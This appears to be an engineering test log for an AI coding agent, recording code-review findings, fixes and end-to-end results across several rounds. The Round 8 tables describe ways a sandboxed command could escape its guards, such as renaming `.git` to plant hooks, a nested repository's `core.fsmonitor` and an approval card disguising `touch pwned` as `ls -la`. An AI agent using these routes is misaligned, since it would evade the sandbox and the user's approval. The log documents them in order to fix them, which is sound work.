| 19B.6 | pass (after R5-35) | app, Gemma, `KURTKODE_AUTOPLAN='…total…|edits'`: first run looped in its reasoning for 10 minutes (R5-35); after the fix, Gemma called present_plan (a first), the plan was sent back, the revision came as text and the fallback presented it, approved, mode saved as Accept Edits, `--lines` with the total made, tests pass |
| 19B.7 | pass | CLI in a pty, Gemma, answered "4 not now, I changed my mind": the reason reached the model, the run stopped as denied, nothing changed, mode still Plan |
| 19B.8 | pass | pmock in Plan mode: read-only commands ran; `git grep -O`, `rg --pre`, `sort --compress-program`, `sed … w`, `tree -o`, `./run.sh --help`, `git --config-env`, `touch` refused; nothing written. Found R5-34 (`rg` not on PATH) |
| 19B.9 | pass | app: `# this project indents with tabs` saved to the project's memory; a new session's prompt had it and Gemma answered from it without reading |
| 19B.10 | pass (the run didn't finish) | app, Gemma, Full Auto, a 9k budget, four files under `lib/` whose `AGENTS.md` asks for a `ZEBRA:` docstring prefix: 5 compactions, the rules sent again after each that dropped them (4 rule messages), and all 3 docstrings written follow them. The run ended on the 4th file when a turn ran out its 5-minute clock: LM Studio sent the start of an `edit_file` call and then nothing (it holds a call's arguments until the call is complete), so Gemma was looping inside the arguments, which nothing in kurtkode can see |
| 19B.11 | pass | Gemma, every scenario once (`eval-results/round5-regression-gemma4-26b.json`): explain-repo, find-definition, fix-tests, deny-feedback, long-doc (14/14, 6 compactions), nested-rules pass; survey 2/5 (Gemma failed it in the earlier eval too) and warn-count (the trap, as in Phase 1's 1/6) fail as before. Found: the eval's recorder dropped injected messages, so nested-rules said its rule file was "never sent" while Gemma followed it; recorded now, and a rerun says "was sent" |

Not fixed (C, noted): a chat's tracked paths can appear twice (absolute from older messages, relative from the run's);
exported secrets are kept for the session and passed to `zsh -c`; a one-line message starting "# " can't be sent as is.

## Round 6 (session 15, 2026-10-26: Phase 2)

Plan: FUNCTIONAL_TESTS.md section 20. Three code reviews of Phase 2 (pool and retry; signals and spending; regressions
and integration) gave 30 candidates, several found by two or three reviewers; a replay of the retry trigger over the
cost-floor re-run's stored runs found two more. Every real one is probed by a unit test in `Round6Tests.swift` or a
test it changed, and fixed in the same pass. One probe found a further bug its finding hid (R6-6). Before: 573 tests.
**After: 588 tests pass with 11 known issues** (the timing tests that fail under load pass alone).

### Findings and fixes, most severe first

| # | Sev | Finding | Fix |
|---|---|---|---|
| R6-1 | A | **A LAN server reached by a name kurtkode can't place counted as remote**, so with the new defaults a local session's subagent tasks, retries and grading went to OpenRouter and Anthropic (`http://studio:1234`, `.lan`, `.home.arpa`, `.internal`, Tailscale names) | automatic routing, retries and the default grader need a hosted main model: `Endpoint.isCloudAPI` (Anthropic, Google, and a list of known hosted APIs) |
| R6-2 | A | A failed run's edits were undone after it released its writer slot (with the grader's call in between), so a second writing subagent's edits to the same file could be wiped; a restore that failed halfway was reported as nothing undone | the retry is decided and the undo done while the run still holds its slots; if the undo fails, no retry |
| R6-10 | A | **The retry fired mostly on runs that had passed** (replay over 1,439 stored runs: 47 triggers, 2 of them real failures): "made-up citations" from files named by their bare name in a subfolder (`pricing.py` for `inventory/pricing.py`) and dotted names in the code (`cache.warm:13`); "no report" from runs cut off at the output limit after doing the work, whose good edits a retry would undo | a bare file name resolves anywhere in the project; a bare dotted name counts as a file only with a file type's extension; "no report" from a run that changed files isn't retried. Replay after: 4 triggers, 1 a real failure |
| R6-11 | A | `cost report --eval` counted degraded copies (their original's record, a forced failure) and infrastructure failures as runs: bank1 showed 1,071 runs and $11 for 612 real runs; cf1's pass rate 81% instead of 93% | both left out, records deduplicated |
| R6-12 | A | A run with a charged request and an uncharged one (a summary on another server) reported only the charge | `RunTotals.spent`: each request's charge or list price, summed; the report uses it |
| R6-3 | B | Retries ignored the user's own choice of subagent model (or an agent file's `model:`) and could go down a tier: a model the pool doesn't know went to the first rung | only runs whose model the pool chose are retried; a model of unknown tier isn't |
| R6-4 | B | A pool.json with one slip (an entry without `"enabled"`) silently brought back the shipped pool; a later toggle in Settings saved it over the user's file | entries read leniently (`enabled`, `roles`, `strong`); an unreadable file gives an empty pool and says why |
| R6-5 | B | Ollama's trained context (`model_info`) was taken for what it serves (`num_ctx`, often a few thousand), so nothing was compacted and the prompt's start was dropped | `num_ctx` from `parameters`; otherwise unknown |
| R6-9 | B | An important task without a tier runs on Haiku, the default grader too, so important tasks were never graded | the automatic grader is the pool's first judge, else reviewer, that isn't the run's own model |
| R6-13 | B | After a retry or Continue, a run's request was the note kurtkode adds after the user's message, so thumbs and the next retry's judgment landed on the earlier run; replies after a queued message or a background report got no thumbs | runs answer the user's last request (not a note or a report); a reply belongs to the run of the nearest request that started one; `/good` and `/bad` rate the run of the latest reply still shown |
| R6-14 | B | A daily limit reached on paid models stopped free local sessions too, and the banner said "Continue" would help | daily limits count only for sessions on a paid server; the stop names the limit and, for a daily one, drops Continue |
| R6-16 | B | The app ignored a model's Tools "On" when OpenRouter listed no tools for it (68 of 468 models) | the profile's setting wins, as in the CLI |
| R6-17 | B | Listed contexts raised OpenRouter sessions from 32k to up to 200k (bigger requests, later compaction) | on OpenAI-compatible servers a listed context only lowers the default |
| R6-18 | B | A re-run of an earlier subagent eval behaved differently under the same label (reasoning no longer inherited, provider pins added) | the eval's subagents keep their old settings; its main target sends a profile's reasoning setting |
| R6-6 | B/C | A retried background run's report named the failed run; and (found by its probe) **a run that changed no files was never retried**, because restoring an empty undo store threw | the report names the second run; restoring nothing returns nothing |
| R6-7 | C | A profile's reasoning setting on a rung's model hid the rung, so a retry skipped a step | a rung without its own setting matches any |
| R6-8 | C | A mistyped `--reasoning` went to the server; Gemini 2.5 Pro was offered "none", which it refuses | levels checked; Pro offers no "none" |
| R6-15 | C | Report keys: a reasoning object's key order split rows, `{"exclude":false}` read as "off"; a project named "all" took the total row's id; local runs' tokens dragged the cache share down; JSON gave $0 for unpriced groups; projects with the same folder name merged | sorted keys, an exact "off" test, a total-row flag, cache share over priced runs, null, full paths |
| R6-19 | C | The Spending window's "Today" was the last 24 hours; the cache notice compared a fallback model's reply with the main model's; app `/good` toggled a thumb off; a rewind labeled every later run 0; the CLI's model listing could wait 300 s | since midnight; main-model replies only; `/good` never withdraws; only the rewound turn's runs; a 10 s limit |

Not fixed (C, noted): a retried background run's "Started…" result still names the first run (the report names the
right one); parallel sessions each read the day's spending when they start, so together they can pass a daily limit;
a store that can't be read counts as nothing spent today; built-in `/good` and `/bad` hide custom commands of those
names. **Defaults changed for existing users** (by design, A2): with the subagent and grader settings never set, sessions
on a hosted model now send subagent tasks to ling-3.0-flash on OpenRouter and important ones' grading to Haiku.

## Round 7 (session 16, 2026-10-26: Phase 3)

Plan: FUNCTIONAL_TESTS.md section 21. Three independent code reviews of Phase 3 (snapshots and rewind; review and
escalation; delegation and integration) gave 37 candidates, the withheld-files gap found by all three; the live checks
added one (the hand-over went through the skill router). Every real one that the core can exercise is probed in
`Round7Tests.swift` (17 probes; R7-1 and R7-3 were checked to fail with their fix undone) or in a test it changed, and
fixed in the same pass. Before: 628 tests. **After: 645 tests pass with 11 known issues** (the timing tests that fail
under load pass alone).

### Findings and fixes, most severe first

| # | Sev | Finding | Fix |
|---|---|---|---|
| R7-4 | A | **Review and hand-over diffs ignored Settings' files withheld from remote models**: a `.env` or `*.pem` change (captured in a folder that isn't a repository, or untracked and not ignored) went to the reviewer, the automatic subagent review, or the escalation model | `UnifiedDiff.withholding` drops those files' sections whenever the destination is remote; the review says what was left out |
| R7-15 | A | A local session's reviewer could be any server kurtkode doesn't recognize (Azure, a cloud VM): the rule used "known hosted API" where it needed "surely local" | a local session's reviewers must be `!isThirdParty` |
| R7-16 | A | Accepting an escalation dropped the pool entry's provider pins (`data_collection: deny`) and reasoning setting | the offer carries them; the session's profile takes them where it sets none (this window or process; not saved) |
| R7-1 | A | **A restore wrote an LFS pointer over the real file, or LF over CRLF**: the project's attributes ran on the way into the shadow repository and never on the way out | the shadow repository's `info/attributes` turns filters, eol and text conversion off (byte-for-byte) |
| R7-2 | A | A folder or file left out at a run's start (over a limit) and captured at its end looked "added", and a revert or rewind deleted it | what a session's snapshot leaves out stays out of its later ones (`skip-<session>`) |
| R7-3 | A | A case-only rename's revert wrote the old name, then deleted the new one, the same file on this disk | deletions before writes |
| R7-6 | A/B | A rewind from snapshots dropped the edit-tool checkpoints of files the snapshots don't cover (extra folders, ignored or oversized files) | those are restored from the checkpoints, as before snapshots |
| R7-7 | A/B | "Revert This Part" took the hunk at the index shown; an edit above it since shifted the index and another hunk, possibly the user's, was reverted | the hunk is found again by its content, or refused; revert buttons off while a run goes |
| R7-5 | A | Changes another session or the user makes *during* a run count as the run's own, and a rewind of it reverts them | **not fixed**: snapshots are of the whole tree at the run's start and end; the user's edits between runs are kept, as documented |
| R7-8 | B | A restore wrote through a link a run put where a folder was, outside the project | refused and named |
| R7-9 | B | A file that became a folder made every later snapshot of the session fail | removals before additions, `--replace` |
| R7-10 | B | The user's global git config reached the shadow repository (`diff.noprefix` broke `apply -R`; textconv drivers) | `GIT_CONFIG_GLOBAL=/dev/null`, no system config |
| R7-17 | B | A hosted server kurtkode can't place counted as tier "local", so it was offered a cheap model (a downgrade, elsewhere) | unknown tier: no offer |
| R7-18 | B | The reviewer was picked against the session's current model, so after a switch a change could be reviewed by its own vendor | another vendor than every model whose runs made the change |
| R7-19 | B | Server errors and timeouts (`turnStopped(failed/timedOut)`) earned offers, with the reason "it stopped early (AgentCore.StopReason.failed)" | only a loop counts ("it got stuck repeating itself") |
| R7-20 | B | The hand-over sent the latest request with an older run's diff (a 👎 on an earlier reply); a late review could bring back a card during the next turn; offers were priced from the current model | the offer's run's own request and model; a late review offers only while its run is the latest and nothing runs |
| R7-21 | B | The CLI reviewed turns that changed nothing (with the review switch on), and re-offered the last run after a turn that failed before recording one | only runs that changed files; one signals offer a run |
| R7-22 | B | A stale card, or `/escalate` when there was nowhere higher, could take an old card and switch the session down a tier | a card is taken only while the session is on its model; switching models sets it aside |
| R7-23 | B | `--trigger-sim`'s "stopped early" counted cost limits, stops and denials, unlike the shipped trigger | the same stops as sessions; tables regenerated |
| R7-24 | B | The reviewers' precision in the trigger tables came from the enriched review sample (8 failures in 32), not the population | labeled as such in GAP_ANALYSIS.md |
| R7-31 | B | The new built-ins `/review`, `/diff`, `/rewind`, `/escalate` hid a user's own commands of those names (`review.md` is common among Claude Code users) | those four yield to a custom command; the older built-ins still can't be replaced |
| R7-33 | B | A task call kurtkode writes into a conversation with Claude thinking breaks the next request (its turn must start with a thinking block); a forced choice to OpenRouter's Claude with a reasoning level is refused | neither there: the note alone |
| R7-34 | B | A message the user queued during the sixth read was followed by a task call written from the old request | the queued message decides |
| R7-38 | B | The hand-over message went through the skill router as a new request (a router question on every escalation; seen live) | the router leaves hand-overs alone |
| R7-11 | C | Overlapping refreshes of the Changes tab could show one scope's files under another's label | a refresh only lands if it's the latest |
| R7-12 | C | Trashed sessions kept their snapshots; "forgotten after 30 days" overstated it (pruning runs on a project's first snapshot of a process) | dropped with the session; the docs say when pruning runs |
| R7-13, R7-14 | C | One folder reached by two paths got two repositories; `~/Documents` and the like could be snapshotted (up to 200 MB) | links resolved; the home folder's big standard folders, `/` and `/Users` refused |
| R7-25 | C | Review costs: the CLI's weren't in the session's costs until reloaded; the escalation review ran after a cost limit | counted at once; no review after a cost limit (a `/review` the user asks for still isn't checked against the limits) |
| R7-26 | C | The reviewer's judgment said it read the files (it saw a diff); a whole session's verdict landed on its latest run | `spot-checked`; no run judgment for a session's review |
| R7-27 | C | `/review -m typo:model` fell back to the default endpoint | refused |
| R7-28 | C | Offers passed by (a new message, another offer, a model switch) stayed recorded as "offered" | recorded as `ignored` |
| R7-29 | C | The CLI's no-Keychain test passed without the feature | a Keychain stand-in that has the key |
| R7-30 | C | Purpose breakdowns didn't list review costs | listed |
| R7-35 | C | The forced choice was lost when that turn was dropped or overflowed | kept until a reply comes back |
| R7-36 | C | A note due on the next reply was lost on a call kurtkode wrote (no meta); the written call counts as a step and a task call in run stats | the note waits for the next reply; the stats are noted, not changed |
| R7-37 | C | Snapshot cost: an automatic review's base tree hashed the whole project; the first snapshot of a large git project has no total cap | the review's index starts from the session's; the cap is noted |
| R7-32 | C | Older builds skip the new record kinds (escalations, review costs, reviewer judgments), so their session spending reads lower | noted |

### End to end (21B)

| ID | Result |
|---|---|
| 21B.0 | pass: 645 tests, 11 known issues; Debug app and CLI build |
| 21B.1 | pass: this repository 1.7 s then 0.20 s; `~/git/sugar` 1.1 s then 0.15 s, eight big untracked folders and files named, 12 MB stored |
| 21B.2 | pass: qwen3-coder-30b changed a file with `sed`; `/diff` and the Changes tab listed it (the old tab didn't); a files-only rewind put it back, kept the conversation, sent the note |
| 21B.3 | pass: a local session's `/review` refused to go remote on its own; `-m` reviewed and kept the judgment; `--review-sim` (GAP_ANALYSIS.md A6) |
| 21B.4 | pass: CLI step-limit offer declined; app card for a failing test after a change (first seen on a run that changed nothing, which led to narrowing that trigger); **accepted live**: qwen3-coder → ling-3.0-flash took over ($0.0002), then offered Haiku, declined; all recorded |
| 21B.5 | see GAP_ANALYSIS.md A7: on a Haiku parent the threshold never tripped; the local run is below |
| 21B.6 | pass: tables regenerated after R7-23 (`eval-results/trigger-sim/offline.md`) |

## Round 8 (2026-10-31: Phase 5 and `ask_user`)

Plan: FUNCTIONAL_TESTS.md section 22. Run on f4ae412. Four independent code reviews, one per batch, gave 60 candidates.
The round itself fixed nothing; the user then chose "fix all, in order", and those fixes are in "Fixes" at the end of this
section. The tables below are what the round found. At the time `Round8Tests.swift` held 40 probes, each stating what
should hold, and 39 failed. The suite was 846 tests with the 11 known issues; six timing tests failed under load and passed
alone.

**How each candidate stands (60)**

| Evidence | Count | IDs |
|---|---|---|
| Shown by a probe or a live run | 36 | W1–W7, W10, W12, W13; C1–C6, C8, C9, C11, C14, C15; F1, F11, F12, F14; T1–T3, T5–T7, T9, T10, T12–T14 |
| Code path read and confirmed, not run | 11 | W8; C7, C10, C12, C13; F2–F6, F9 |
| From its review only, not rechecked | 12 | W11, W14, W15; F7, F8, F10, F13, F15; T4, T8, T11, T15 |
| Not reproduced | 1 | W9 (`r8_w9` passes: the tripwire didn't run, in the one form tried) |

C10 rests on Return submitting a vertical `TextField`, which needs a click to see. T15: a crash leaving the terminal raw
wasn't seen; `t8.py`'s normal ways out are all clean.

### Findings, most severe first

**W: worktrees and the sandbox**

| ID | Sev | Finding | Evidence |
|---|---|---|---|
| W3 | A | Renaming a parent gets round every guard: `mv .git /tmp/g`, write `hooks/pre-commit`, move it back; the same for a worktree's git folder and a worktree. **The `.git` form is in every sandboxed project, not only worktrees, and it predates Phase 5** | `r8_w3a–c` |
| W1 | A | A sandboxed command can make a nested repository whose `core.fsmonitor` runs **outside the sandbox** on kurtkode's own `git status`: at the end of an isolated subagent, with no click, and on a Git panel refresh. A tripwire ran | `r8_w1`, `r8_w1b` |
| W2 | A | One worktree can rewrite another's `commondir`, forge a new worktree, or move the main checkout's `HEAD`; the main checkout can rewrite a worktree's `.git`, `commondir` and `.git/config.worktree`. A tripwire ran from worktree B's next `git status` | `r8_w2a–d` |
| W4 | A | A commit that fails at a subagent's end deletes its work and reports "changed nothing" (`commit.gpgsign` with signing that can't work) | `r8_w4` |
| W5 | A | `finish` measures HEAD but keeps the branch: detached commits are dropped while the report says they're on the branch; a switch back drops the branch's commits | `r8_w5a–b` |
| W6 | A | Merge's failure handler aborts a merge the user already had open, with their resolutions | `r8_w6` |
| W7 | A | A detached worktree's commits count as nothing to lose, so the removal guard passes | `r8_w7` |
| W8 | A | Sidebar removal always forces, on counts taken when the dialog opened | read |
| W10 | A | Stash Drop is by position, with no confirmation: another session's stash shifts the numbers and the wrong one goes | `r8_w10` |
| W11 | A | "Merge into main" can land on another branch: the label is from the last refresh | review |
| W12 | B | A worktree started from a worktree starts at the main checkout's HEAD, without that session's commits | `r8_w12` |
| W13 | C | Plan mode's read-only sandbox leaves `<repo>/.git` writable from a worktree | `r8_w13` |
| W14 | C | Stopping a run loses a background isolated subagent's report | review |
| W15 | C | The accessibility Revert action stays live in the Git bases | review |

**C: capabilities**

| ID | Sev | Finding | Evidence |
|---|---|---|---|
| C4 | A | A number too big for an Int in a tool call aborts the process (`Tool.swift:244,252`): `{"start": 1e20}` or a huge `path`. In the app that ends every chat | `t9.py`: the CLI crashed both ways |
| C1 | A | `web_fetch` escapes deny and ask rules with a leading space or a trailing dot in the address | `r8_c1a–b` |
| C2 | A | MCP resource tools escape `mcp__server` rules (and hook matchers) | `r8_c2` |
| C3 | A | A withheld or denied name is read through a symlink: `.env -> config/prod.conf` goes to a remote model. Predates Phase 5 | `r8_c3a–b` |
| C5 | B | A hook matcher `WebFetch` never fires, for the one tool that leaves the machine | `r8_c5` |
| C6 | B | A page of unclosed `<!--` is quadratic with no way to stop it: 4k openers 1.6 s, 16k 25.9 s; by that curve, in this Debug build, a 5 MB page would pin a thread for over a day | `r8_c6` |
| C7 | B | `read_file` loads the whole file before any check | read |
| C8 | B | The PDF hint names the wrong page: a cut range from 50 says "18-27" | `t9.py` |
| C9 | B | SessionStart runs again after `/compact`: 2 runs in one session | `t9d`, a forced compaction |
| C10 | B | Return in any box may send the whole multi-question card | read, unconfirmed |
| C11 | C | A page wrapped in `<form>` comes back empty, unsaid | `r8_c11` |
| C12 | C | MCP server instructions are lost after a compaction | read |
| C13 | C | `listResources` never ends on empty pages with a cursor | read |
| C14 | C | `/btw` sends nothing when the latest message is over 24k; it also keeps removed messages after `/retry` | `r8_c14` |
| C15 | C | Five IPv6 forms aren't refused (`::7f00:1`, `fec0::/10`, 6to4, NAT64, `ff02::1`); needs a route to matter | `r8_c15` |

**F: app friction**

| ID | Sev | Finding | Evidence |
|---|---|---|---|
| F1 | A | A long paste starting with `!` runs as an unsandboxed shell command the user never saw: the composer showed `[Pasted text #1: 15 lines]` and `pasted-ran` appeared. One starting with `# ` goes to memory, not the model | live, Debug app on a mock |
| F2 | A | The title request drops OpenRouter provider pins, so text goes to providers the user excluded | read |
| F3 | A | The title goes to whichever model is selected after the run, which may be a new remote one | read |
| F4 | A | The title is sent after Stop, after a cost limit, and after Move to Trash | read |
| F5 | A | A queued item the drain refuses is lost | read |
| F6 | A | The queue's pencil overwrites the draft | read |
| F7 | A | With a `UserPromptSubmit` hook the drain loses the draft and Esc is ignored | review |
| F8 | B | A queued message loses its image, which goes with something else | review |
| F9 | B | Putting the queue back joins commands and messages into one draft: `!npm test` plus a sentence then runs as one script | read |
| F10 | B | A message queued after a command overtakes it | review |
| F11 | B | After ↑ then ↓, ↑ walks a stale list: it gave `alpha` when `beta` was newer | live |
| F12 | B | A fork ending on a request shows the false "cut off" banner, with a paid Continue | `r8_f12` |
| F13 | C | ↑ on a typed draft can lose it | review |
| F14 | C | Search for `cafe` misses `café` | `r8_f14` |
| F15 | C | Find leaves the transcript not following | review |

**T: the CLI's live screen**

| ID | Sev | Finding | Evidence |
|---|---|---|---|
| T1 | A | Nothing is sanitized, so an approval card can lie: a `touch pwned` command showed as `$ ls -la`. A reply's OSC 52 (clipboard) and screen clear reach the terminal | `t9.py`, `t9d`, `r8_t1` |
| T3 | A | Esc on a `!command` still runs what's queued, unsandboxed and unasked | `t9.py` |
| T5 | A | `/resume` takes the session's Full Auto over `--mode ask`, so the next command ran without asking | `t9.py` |
| T2 | A | Words typed as a card opens answer it at once: `y` Enter within 0.1 s approves | `r8_t2` |
| T4 | A | Prefix matching at follow-up prompts takes typed-ahead as a yes: `explain it` accepts a paid hand-over | review |
| T6 | B | A long prompt or an option's newline overflows the frame, flooding the terminal | `r8_t6a–b` |
| T7 | B | A question opening during Ctrl-R is hijacked by the search | `r8_t7` |
| T8 | B | Shift-Tab after a plan approval steps from a stale mode | review |
| T9 | B | A long paste in an answer sends the token, not the text | `r8_t9` |
| T10 | B | An image alone during a run is a blank message | `r8_t10` |
| T11 | B | A message taken at the next step is never shown; `# fact` during a run goes to the model | review |
| T12 | B | Tabs and escapes in the composer are drawn raw | `r8_t12` |
| T13 | C | ✅ ❌ ⭐ ⚡ measure 1 | `r8_t13` |
| T14 | C | Alt-letter acts as Esc, so it can stop a run or deny an approval | `r8_t14` |
| T15 | C | A crash can leave the terminal modified | review |

### End to end (22B)

| ID | Result |
|---|---|
| 22B.0 | pass: 846 tests, 11 known issues; six timing tests failed at load average 25 and passed alone; Debug app and CLI build |
| 22B.1 | pass: `t1` 33, `t2` 42, `t3` 24 (`t2` needed its fixture written in) |
| 22B.2 | pass: `t4` 19 |
| 22B.3 | pass: `t5` 15, with its hook and a real PNG now set up by the scenario, and a check on the image's bytes added |
| 22B.4 | pass: `t6` 22 |
| 22B.5 | pass: drawn in the Claude app's Terminal panel, a real emulator: wide characters, an emoji, a list, a code block, a live run with its tail, a wrapped line, no leftovers. The panel can't take keys, so typing and exits there are not covered |
| 22B.5b | pass: `t8` 14 of 14 that apply: Ctrl-D, `/exit`, Ctrl-C twice, SIGTERM, SIGHUP, idle and in a run, each leaves stty as it was with bracketed paste off |
| 22B.6 | pass: `t7` 8: a real 1-page and 97-page PDF, a damaged one, a macOS HEIC, a 3000-pixel PNG sent as 1568×882 (554 KB from 9.3 MB). C8 is the one fault found here |
| 22B.7 | pass for the queue (the second message reached the model); F1 and F11 found here. Fork, find and the banner not repeated: unit level |
| 22B.8 | **partial**: a chat in a repository, but the Git panel didn't open, so nothing here tests it; `WorktreeTests` and the W probes cover the operations |
| 22B.9 | not repeated: passed at f4ae412 ($0.26), and nothing has changed since |
| 22B.10 | pass: `t10` 5, on qwen3-coder-30b, free: a session in a worktree, a queued message acted on, the main checkout untouched, a real fetch |
| 22B.11, 12 | not run: they need the user |

**Not tried**: a real MCP server, a real vision model, native Anthropic, a real GitHub remote.

**What the run itself did wrong.** The first app launches used a Debug build with the installed app's bundle id, so they
wrote to the user's real preferences, and `KURTKODE_MODEL=pm/model` without `Mock|` chose This Mac's LM Studio. `pm/model`
landed in `recentModels` (removed by hand; the other 11 entries are as they were) and the hook's `lms load` very likely
loaded `qwen/qwen3-coder-30b` at 32k: nothing was loaded before those launches and the context matches the hook's. It
was left loaded, and `t10` used it. LM Studio's log wasn't available to confirm. Later launches used a separate bundle id.

### Fix options

1. **Recommended: fix in this order, a commit for each, probes turning green.** (a) The sandbox and kurtkode's own git:
   W1–W3, W13. Guards alone won't do it: block renames of each guarded path's ancestors, open only what a worktree needs
   of `<repo>/.git`, and run kurtkode's git with `--ignore-submodules=all` and its config overridden, or read-only
   sandboxed. (b) What the model can make the CLI or app do: C4, T1, T2, T3, T5, F1. (c) Rules and privacy: C1, C2, C3,
   F2–F4. (d) Lost work: W4–W8, W10, W11, F5–F7. (e) The B and C rows.
2. Only (a) and (b) now, the rest in TODO.md. They are where a model's text gets past the user or the sandbox.
3. Hold the Phase 5 install until (a) and (b) are in, whichever else is chosen. W3 and C3 are in older builds too.

### Fixes (2026-10-31)

The user chose option 1. Five commits and one more, on main, not pushed:

| Commit | Rows |
|---|---|
| acde196 | W1, W2, W3, W13 |
| c5babef | C4, T1, T2, T3, T4, T5, F1 |
| 90a292e | C1, C2, C3, C5, F2, F3, F4 |
| eccc866 | W4, W5, W6, W7, W8, W10, W11, F5, F6, F7 |
| 7b53a14 | W12, W14, W15, C6–C15, F8–F15, T6–T15 |
| 85b9373 | a new finding, X1, below |

W9 wasn't reproduced and nothing was changed for it. Results and the docs are not committed.

**Found while fixing**

| ID | Sev | Finding | Fix |
|---|---|---|---|
| X1 | A | A write to the stdin of a hook, git or an MCP server that had already gone raised SIGPIPE, which ends the process: the app or the CLI, unsaid. It killed the test run twice; the first time it went unnoticed, because the run's summary line was simply missing | `F_SETNOSIGPIPE` on each pipe. Ignoring the signal would pass to every command run |
| X2 | A | A rename could also make `.git` out of a prepared folder in a project without one, with hooks in it | `.git` itself is read-only. `git init` at the top of a sandboxed project already failed on `.git/config`, so nothing is lost |
| X3 | B | `web_fetch`'s other patterns were quadratic the same way as C6, and its rewriting loops took time in matches times page size | One pass from the end takes out what can't match; the loops are one pass |
| X4 | B | `listTools` had the same endless loop as C13's `listResources` | The same page limit |

**How each was checked**

| Check | Result |
|---|---|
| The suite | 924 tests, the 11 known issues. In a full run at load average 40 about 4–10 timing tests fail, a different set each time; every one of them passes alone (13 of 13). All 78 Round 8 probes pass, 38 of them added with the fixes |
| pty scenarios, final build | all pass: `t1` 33, `t2` 42, `t3` 24, `t4` 19, `t5` 15, `t6` 22, `t7` 8, `t8` 22 (SIGQUIT, SIGABRT and SIGSEGV leave the terminal as it was: T15), `t9` 11 (T1, T3, T5, C4, C8 and C9, with a real compaction) |
| `t10`, real local model | 5 of 5 on qwen3-coder-30b, the one already loaded, free: a sandboxed session in a worktree, a queued message, a fetch |
| Live app, Debug build on a mock, own bundle id | F1: the paste reached the model as a message and `pasted-ran` didn't appear. F11: ↑ gave `beta`. A queued message went in after the run. The app compiles (that check caught a broken button) |

Checked only by a unit test, or only compiled: the app's dialogs and views (W8, W10's confirmation, W11, W15, C10, F15), the
title's guards (F3, F4; F2's providers have a unit test), the queue's refusals (F5–F8). No test runs W14, C12's note going back
in (the list it reads has one), C13, T8 or T11. No paid call was made.

**Scenario changes**: `drive.py` waits out the 0.5 s after a question opens. `t3` queues its message ahead of the commands (F10
changed the order that was the test). `t4` drops the subagent's branch first (W12 means its commits are on it too). `t8`'s
two wrong cases are corrected and SIGABRT and SIGSEGV added, for T15. `t9`'s fetch answers its approval, and its compaction now
really happens. Their first reruns failed on leftovers and timing, each traced: `new.txt` and marker files from the last run in
the same folder, a Stop that took 3 s, a slow DNS lookup before a card.

**Behavior that changed, on purpose**

- A sandboxed `git worktree add`, and `git gc` in a worktree, are refused. So are a main-checkout command's writes to `.worktrees`.
- What's typed within 0.5 s of a question opening goes on the draft, and Enter is ignored.
- `/resume` keeps the terminal's mode. `--continue` at startup still restores the session's.
- Messages stay behind a command queued before them, where they used to overtake it.
- A message with images can't be queued during a run.
- `web_fetch` takes a page's text out of `<form>`.
- `read_file` refuses files over 200 MB and anything that isn't a regular file.
- A draft put back with a command in front starts with `Queued:`, so that it stays one message.

**Left open** (TODO.md, "Round 8"): a nested repository's config still runs on the user's own `git status` in a terminal;
Plan mode's unreadable patterns don't follow a link for a command; a worktree's command can move `main`'s ref.

## Real local models (2026-10-31: Phase 5's reach, on qwen3-coder-30b)

Free, in the CLI, on the model already loaded, isolated, from `t11.py`. One real page and one real PDF.

| What | Result |
|---|---|
| `web_fetch`, Wikipedia's long Swift page | Asked in Full Auto, fetched, marked as data, answered from it (Lattner). The first part was 15.6k characters at ctx 42%, and the model went on with `start` |
| `read_file`, Apple's 14-page licence | 14 pages and section 2's title, then `pages: "14"` and its last sentence |
| `/btw` | 1.2 s during a command, 9 s during a stream (LM Studio's one slot waits); the run carried on unharmed |
| Esc in a real stream | Ended at once; the next reply took 4.9 s |
| An image on a model that can't see | Says so; the model didn't pretend |
| An image on a vision model | **Unproven.** It reached gemma-4-e4b-it in the request and the model invented a reply, but the page was 77% transparent. An opaque retest was held back by memory (below) |
| A real MCP server | **Not tried.** No SDK or server is installed, and fetching one is a third-party download |

**Fixed, each from what the real model did:**
- It sent `pages: "all"`, the description's own word, got an error and went to `pdftotext`. "all", empty and "*" now mean the whole
  file, the description says to leave it out, and so does the error.
- The CLI took every LM Studio model as unable to see, so vision never worked there. It now reads LM Studio's list, as the app does.
- A `y` to a page asked again for each later part of it. A yes now covers that address's other parts for the run, not other pages.
- `rate_task` looped with invented names when no subagent had run. The error now says there's nothing to rate. A clean run isn't
  proof, since it came and went between runs.

**Harness**: keys don't answer a question for its first half second (Round 8, on purpose), so the first fetch run hung on my
script's instant `y`, and `t5.py` needed the pause. Not a bug.

**Memory**: loading gemma-4-e4b-it (6 GB) beside qwen3-coder took free memory to 32%, and unloading it left 44%, with the compressor
at 32 GB and swap up from 15 to 25 GB. It hadn't recovered after several minutes, so the retest was skipped. qwen3-coder was left loaded.

